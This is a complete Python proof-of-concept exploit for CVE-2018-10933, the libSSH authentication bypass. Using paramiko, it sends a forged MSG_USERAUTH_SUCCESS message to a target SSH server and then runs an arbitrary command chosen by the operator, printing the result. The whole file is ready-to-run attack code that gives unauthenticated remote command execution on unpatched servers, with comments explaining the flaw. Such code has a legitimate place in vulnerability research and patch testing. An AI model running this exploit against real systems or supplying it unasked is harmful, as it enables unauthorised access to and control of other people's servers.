#!/usr/bin/env python3

# original exploit PoC reference https://github.com/blacknbunny/CVE-2018-10933
import paramiko
import socket
import argparse
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--command', help='Command to execute', default='id')
parser.add_argument('-log', '--logfile', help='Logfile to write conn logs', default="paramiko.log")

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port, command):

    # create a new socket    
    sock = socket.socket()
    try:
        # connect socket to specified host and port
        sock.connect((str(hostname), int(port)))

        # create message, and append MSG_USERAUTH_SUCCESS byte - this is the vulnerability
        # when libssh recieves this byte, it effectively bypasses all authentication and 
        # thinks the user was already successfully authenticated.
        # more detail can be found in the CVE entry here:
        # https://nvd.nist.gov/vuln/detail/cve-2018-10933 
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        # create an ssh client for the socket using paramiko
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        # send the crafted message
        transport._send_message(message)
    
        # execute the command specified
        spawncmd = transport.open_session(timeout=10)
        spawncmd.exec_command(command)
        
        # open the stdout of the connection with a 2048 byte buffer
        stdout = spawncmd.makefile("rb", 2048)
        # read the output and decode it to text
        output = stdout.read().decode('utf-8')
        # close the output buffer
        stdout.close()
        
        # print the output to the terminal
        print(output)
        
        return 0

    # catch all exceptions and print ssh related exceptions
    except paramiko.SSHException as e:
        print(e)
    except socket.error:
        print("Unable to connect.")
    return 1


def main():
    # try to use argparse to parse the arguments
    try:
        hostname = args.host
        port = args.port
        command = args.command
    # print usage and exit otherwise
    except:
        parser.print_help()
        exit(1)
    # if correct arguments, run the exploit.
    BypasslibSSHwithoutcredentials(hostname, port, command)

if __name__ == '__main__':
    sys.exit(main())
